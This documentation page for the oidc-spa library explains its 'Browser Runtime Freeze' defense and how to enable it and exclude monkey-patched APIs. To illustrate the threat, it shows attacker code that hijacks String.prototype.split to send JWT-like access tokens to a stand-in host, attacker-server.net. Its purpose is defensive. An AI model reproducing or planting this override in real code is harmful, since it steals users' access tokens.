---
description: Ensuring the integrity of the browser runtime environment.
icon: igloo
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/oygeayjvIPxroUcp3jt4/security-features/browser-runtime-freeze
---

# Browser Runtime Freeze

This is the most important security defense. It’s a prerequisite for the other measures to be effective.

It ensures the integrity of the browser environment. This blocks attackers from altering core JavaScript behavior to exfiltrate tokens.

## Enabling the defense

{% tabs %}
{% tab title="Vite Plugin" %}
<pre class="language-typescript" data-title="vite.config.ts"><code class="lang-typescript">import { defineConfig } from "vite";
import { oidcSpa } from "oidc-spa/vite-plugin";

export default defineConfig({
    plugins: [
        // ...
        oidcSpa({
            // ...
<strong>            browserRuntimeFreeze: {
</strong><strong>                enabled: true,
</strong><strong>                // exclude: ["Promise", "fetch", "XMLHttpRequest"]
</strong><strong>            }
</strong>        })
    ]
});
</code></pre>
{% endtab %}

{% tab title="Manual" %}
This defense is only effective if `oidcEarlyInit()` runs first. It must run before any other code is evaluated. If you call it from **oidc.ts** (instead of your entrypoint), the environment may already be compromised.

<pre class="language-typescript" data-title="src/main.ts"><code class="lang-typescript">import { oidcEarlyInit } from "oidc-spa/entrypoint";
<strong>import { browserRuntimeFreeze } from 'oidc-spa/browser-runtime-freeze';
</strong>
const { shouldLoadApp } = oidcEarlyInit({
    // ...
<strong>    securityDefenses: {
</strong><strong>      // ...
</strong><strong>      ...browserRuntimeFreeze({
</strong><strong>        //exclude: [ "fetch", "XMLHttpRequest", "Promise"]
</strong><strong>      })
</strong><strong>    }
</strong>});

if (shouldLoadApp) {
    import("./main.lazy");
}
</code></pre>
{% endtab %}
{% endtabs %}

## browserRuntimeFreeze.exclude

Your app may fail to start after enabling `browserRuntimeFreeze`.

You might see an exception like this:

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

In this example, [Zone.js](https://www.npmjs.com/package/zone.js) tries to overwrite `window.fetch`. Other libraries can do the same. Telemetry libraries are common offenders (for example, [@microsoft/applicationinsights-react-js](https://www.npmjs.com/package/@microsoft/applicationinsights-react-js)).

You have two options:

1. Remove or replace the library that monkey-patches the runtime.\
   ([For example, can you go zoneless?](#user-content-fn-1)[^1])
2. Add an exception for a specific API.\
   For example, add `"fetch"` to `exclude` to allow patching `fetch`.

**How much is my security posture degraded by adding exclusion?**

Excluding `fetch` and `XMLHttpRequest` is usually **not too bad**. Although they are the first APIs attackers try to instrument, [DPoP](dpop.md) and/or [Token Substitution](token-substitution.md) makes those vectors much less useful.

The APIs that are most critical like `Function`, `String`, or `JSON` are very rarely instrumented by legitimate library so you shouldn't have to exclude them. &#x20;

## Understanding What This Protects Against

In JavaScript, most built-in APIs can be altered at runtime.

Consider this attack:

```javascript
// Attacker's code, ran either via XSS or a compromised dependency.

const split_original = String.prototype.split;

String.prototype.split = function (...args) {

    if (this.match(/^[\w-]+\.[\w-]+\.[\w-]+$/)) {
        fetch(`https://attacker-server.net?likelyAccessToken=${this}`);
    }

    return split_original.apply(this, args);
    
}

// Legitimate code that runs later:

// Just like that, the token has been leaked.
const [header, payload, signature ] = accessToken.split(".");
```

`browserRuntimeFreeze` exists to prevent this.

It ensures that `.split()`, `fetch()`, or `Promise.then()` calls the real browser built-in. It blocks monkey-patched versions from dependencies or XSS.

With `browserRuntimeFreeze` enabled, `String.prototype.split = () => {}` throws at runtime.

[^1]: Note specific to Angular project and Zode.js: You can also move the import of "zone.js" in your main.js file, so the alteration happen before oidc-spa lock down the environement. This will prevent you from having to exclude anything.
